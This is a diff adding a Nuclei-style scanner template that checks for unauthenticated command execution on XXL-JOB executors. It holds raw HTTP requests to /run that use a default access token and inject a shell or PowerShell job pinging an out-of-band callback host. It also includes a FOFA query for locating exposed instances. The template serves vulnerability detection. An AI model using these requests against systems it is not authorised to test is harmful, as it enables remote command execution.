@@ -1,0 +1,84 @@
+id: xxljob-executor-unauth
+
+info:
+  name: XXL-JOB executor - Unauthorized Access
+  author: k3rwin
+  severity: critical
+  description: |
+    XXL-JOB is a distributed task scheduling platform. Its core design goals are rapid development, easy learning, lightweight, and easy expansion. The source code is now open and connected to the online product lines of many companies, ready to use out of the box. XXL-JOB is divided into two ends: admin and executor. The former is the background management page, and the latter is the client for task execution. The executor is not configured with authentication by default, and unauthorized attackers can execute arbitrary commands through the RESTful API.
+  reference:
+    - https://github.com/jas502n/xxl-job/blob/main/README.md
+    - https://github.com/vulhub/vulhub/blob/master/xxl-job/unacc/README.md
+  classification:
+    cpe: cpe:2.3:a:xuxueli:xxl-job:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: xuxueli
+    product: xxl-job
+    fofa-query: app="XXL-JOB"
+  tags: xxljob,unauth,misconfig,rce
+
+http:
+  - raw:
+      - |
+        POST /run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Xxl-Job-Access-Token: default_token
+        Content-Length: 396
+
+        {
+          "jobId": {{rand_int(1000)}},
+          "executorHandler": "demoJobHandler",
+          "executorParams": "demoJobHandler",
+          "executorBlockStrategy": "COVER_EARLY",
+          "executorTimeout": 0,
+          "logId": 1,
+          "logDateTime": 1586629003729,
+          "glueType": "GLUE_SHELL",
+          "glueSource": "ping {{interactsh-url}}",
+          "glueUpdatetime": 1586699003758,
+          "broadcastIndex": 0,
+          "broadcastTotal": 0
+        }
+      - |
+        POST /run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Xxl-Job-Access-Token: default_token
+        Content-Length: 396
+
+        {
+          "jobId": {{rand_int(1000)}},
+          "executorHandler": "demoJobHandler",
+          "executorParams": "demoJobHandler",
+          "executorBlockStrategy": "COVER_EARLY",
+          "executorTimeout": 0,
+          "logId": 1,
+          "logDateTime": 1586629003729,
+          "glueType": "GLUE_POWERSHELL",
+          "glueSource": "ping {{interactsh-url}}",
+          "glueUpdatetime": 1586699003758,
+          "broadcastIndex": 0,
+          "broadcastTotal": 0
+        }
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"code":200}'
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+# digest: 490a0046304402204a4c0c46bb114862ec668e87e82b81f1d5e57709da1ab2065ace282481631e06022068cc90c7a12e0fe2a22865646ac4f23c021f5a385cf856fcb64c987ae29f3fde:922c64590222798bb761d5b6d8e72950
